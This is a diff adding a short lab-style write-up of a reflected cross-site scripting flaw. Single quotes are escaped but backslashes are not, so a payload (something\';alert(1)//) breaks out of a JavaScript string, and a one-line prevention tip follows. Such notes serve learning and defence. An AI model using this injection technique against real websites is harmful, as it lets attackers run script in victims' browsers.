@@ -1,0 +1,31 @@
+Vulnerability:
+	The server escapes the single quote but not the backslash,
+	Allowing an attacker to take advantage of it by using a backslash to escape the escaping backslash, so the single quote is not affected.
+	
+Exploit:
+	Example:
+		something\';[PAYLOAD]//
+	
+	Exploit Script:
+		something\';alert(1)//
+	
+Explanation:
+		- By injecting a string i can see that it is reflectedd in the searchTerms variable:
+		var searchTerms = 'something';
+	
+	- So to be able to inject a payload ill add a backslash, a singel quote and a semicolon at the beginning:	
+		var searchTerms = '\';[PAYLOAD]';
+	
+	- And to prevent it from causeing an error because what is left is a single open quote without a closing quote, i'll add two slashes (//) in the end of the input like so:
+		var searchTerms = '\';[PAYLOAD]//';
+	
+	- Then it will be seen to the page like so:
+		<script>
+			var searchTerms = 'something\\';
+			[PAYLOAD]
+			.
+			.
+		</script>
+	
+Prevention:
+	- Escape special characters or do not allow them in the first place.
